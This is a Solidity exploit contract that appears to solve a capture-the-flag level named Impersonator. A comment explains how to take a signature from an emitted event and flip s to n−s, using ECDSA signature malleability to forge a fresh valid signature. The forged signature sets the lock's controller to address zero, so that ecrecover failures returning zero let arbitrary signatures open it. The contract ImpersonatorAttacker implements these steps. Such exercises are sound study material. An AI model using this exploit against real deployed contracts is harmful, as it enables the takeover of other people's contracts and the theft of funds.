// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IECLocker{
    function changeController(uint8 v, bytes32 r, bytes32 s, address newController) external;
}
/*
    The catch here is to get the signature from the newlock event emitted by scanning the Impersonator 
    contract address in block scanner 
    After that reverse the value of s to exploit the underlying elliptical curve property of a reverse image
    with this we get an unused valid signature
    Further we set the controller to zero by using this new signature and calling changeController function
    This works because ecrecover returns 0 in case the math inside breaks, so now when we call open with
    any invalid values of r,v,s we will get 0 from ecrecover which will match the controller set to 0 from
    previous step. This passes first test and now for the usedsignature, since we are sending random values of
    r,v,s there is a likely chance this was not used before so the open succeeds. Otherwise we can do and hit and 
    trial with a few r,v,s values and easily open the door
*/
contract ImpersonatorAttacker  {

    function attack(bytes calldata signature, address targetAddress) public {
        (uint8 v, bytes32 r, bytes32 s) = signatureToComponents(signature);
        uint256 n = uint256(0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141);
        uint256 newS = n - uint256(s);
        uint8 newV;
        if (v == 27) {
            newV = 28;
        } else if (v == 28) {
            newV = 27;
        }

        IECLocker(targetAddress).changeController(newV, r, bytes32(newS),address(0x0));
    }

    function signatureToComponents(bytes calldata signature) public pure returns(uint8, bytes32, bytes32) {
        bytes32 r = bytes32(signature[0:32]);
        bytes32 s = bytes32(signature[32:64]);
        bytes32 v = bytes32(signature[64:96]);

        return(uint8(uint256(v)), r, s);
    }
}